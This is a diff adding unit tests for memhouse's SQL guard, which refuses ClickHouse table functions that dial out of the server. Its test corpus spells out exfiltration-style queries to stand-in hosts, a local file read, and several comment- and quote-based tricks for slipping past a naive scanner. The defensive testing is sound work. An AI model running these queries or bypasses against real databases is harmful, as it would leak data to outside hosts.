@@ -179,6 +179,91 @@ test('no house: every tool refuses as an isError RESULT that names the fix — n
   assert.strictEqual(list.result.tools.length, 6);
 });
 
+// ── the dial-out guard (memhouse/server/sql-guard.js) ───────────────────────────
+//
+// Shared with the dashboard's /api/query, and until now never unit-tested on either
+// surface — the four bypasses in its comments were all found by hand. They are the
+// corpus below. What must hold: nothing that leaves this server gets through, and
+// ordinary read SQL — including a housemate's shared database, which the MCP tool is
+// SUPPOSED to reach — is not refused.
+
+const sqlGuard = require('../memhouse/server/sql-guard');
+const refuses = (sql) => sqlGuard.disallowedTableFunction(sql);
+
+test('the guard refuses every way out of this server, including the four disguises', () => {
+  const out = [
+    ["SELECT * FROM remote('192.0.2.7:9000', 'system', 'one', 'u', 'p')", 'remote'],
+    ["SELECT * FROM remoteSecure('h:9440', 'system', 'one')", 'remoteSecure'],
+    ["SELECT * FROM cluster('c', 'system', 'one')", 'cluster'],
+    ["SELECT * FROM clusterAllReplicas('c', 'system', 'one')", 'clusterAllReplicas'],
+    ["SELECT * FROM url('http://example.invalid/x', 'LineAsString')", 'url'],
+    ["SELECT * FROM file('/etc/hostname', 'LineAsString')", 'file'],
+    ["SELECT * FROM s3('https://b.s3.amazonaws.com/k', 'CSV')", 's3'],
+    ["SELECT * FROM mysql('h:3306', 'db', 't', 'u', 'p')", 'mysql'],
+    // view() and merge() take a table expression or a database name as an ARGUMENT —
+    // allowing them re-opens everything the allowlist is for.
+    ['SELECT * FROM view(SELECT count() FROM system.tables)', 'view'],
+    ["SELECT * FROM merge('other_db', '^messages')", 'merge'],
+    // The four disguises, each of which desyncs a scanner that does not model the
+    // construct the marker appears in.
+    ["SELECT * FROM /* ' */ remote('h:9000', 'system', 'one')", 'remote'],          // quote in a comment
+    ["SELECT '--' AS a, * FROM remote('h:9000', 'system', 'one')", 'remote'],       // comment marker in a string
+    ["SELECT $d$'$d$ AS x, * FROM remote('h:9000', 'system', 'one')", 'remote'],    // quote in a heredoc
+    ["SELECT * FROM # '\n remote('h:9000', 'system', 'one') --'", 'remote'],        // quote in a # comment
+    ['SELECT * FROM "remote"(\'h:9000\', \'system\', \'one\')', 'remote'],           // quoted identifier
+    // Table position is not only after FROM.
+    ["SELECT * FROM messages JOIN sessions ON 1=1, remote('h:9000', 'system', 'one')", 'remote'],
+    ['SELECT * FROM numbers(1) AS "WHERE", remote(\'h:9000\', \'system\', \'one\')', 'remote'],
+    ["SELECT * FROM numbers(1) WHERE 1 IN (SELECT * FROM remote('h:9000', 'system', 'one'))", 'remote'],
+    ["DESCRIBE url('http://example.invalid/x')", 'url'],                            // inference dials out
+  ];
+  for (const [sql, fn] of out) {
+    assert.strictEqual(refuses(sql), fn, `must refuse ${fn}(): ${sql}`);
+  }
+});
+
+test('the guard lets ordinary read SQL — and a housemate\'s shared house — through', () => {
+  const fine = [
+    'SELECT 1',
+    'SELECT count() FROM messages',
+    'SELECT * FROM numbers(10)',
+    "SELECT * FROM values('x UInt8', 1, 2)",
+    'SELECT * FROM format(JSONEachRow, \'{"a":1}\')',
+    // The shape of memhouse's own session rollup: calls in a derived table, and a
+    // comma inside a SELECT list, neither of which is a table expression.
+    'SELECT any(title), count() FROM (SELECT session_id, title, count() AS c FROM messages GROUP BY session_id, title)',
+    "SELECT * FROM messages ARRAY JOIN splitByChar(',', content) AS part",
+    'SELECT a.session_id FROM messages AS a JOIN sessions AS b ON a.session_id = b.session_id',
+    // Cross-house reads are a FEATURE of this tool (a shared house, named). The
+    // dashboard confines reads to its own database; the MCP tool must not.
+    'SELECT count() FROM yigit.messages',
+    'SELECT count() FROM system.tables',
+    // A dial-out name that is not in table position is not a table function.
+    "SELECT url FROM messages WHERE content LIKE '%remote(%'",
+  ];
+  for (const sql of fine) {
+    assert.strictEqual(refuses(sql), null, `must allow: ${sql}`);
+  }
+});
+
+test('the sql tool refuses a dial-out as an isError tool result, naming the function and the fix', async () => {
+  const s = newState();
+  const r = await handle(req('tools/call', {
+    name: 'sql',
+    arguments: { query: "SELECT * FROM remote('192.0.2.7:9000', 'system', 'one', 'u', (SELECT 'stolen'))" },
+    _meta: modernMeta,
+  }, 9), s);
+  assert.ok(r.result.isError, 'refused as a tool result, not a protocol error');
+  const text = r.result.content[0].text;
+  assert.ok(text.includes('remote()'), 'names the function');
+  assert.ok(text.includes('does not reach out of it'), 'says why');
+  assert.ok(/sessions, messages, tool_calls/.test(text), 'names what to query instead');
+  // The refusal must land BEFORE the no-house check would: this runner has no house,
+  // and a guard that ran second would answer "no house configured" and hide the reason
+  // on any configured install.
+  assert.ok(!text.includes('no house configured'), 'the dial-out reason is what the caller sees');
+});
+
 (async () => {
   for (const [name, fn] of tests) {
     try { await fn(); passed++; } catch (e) {
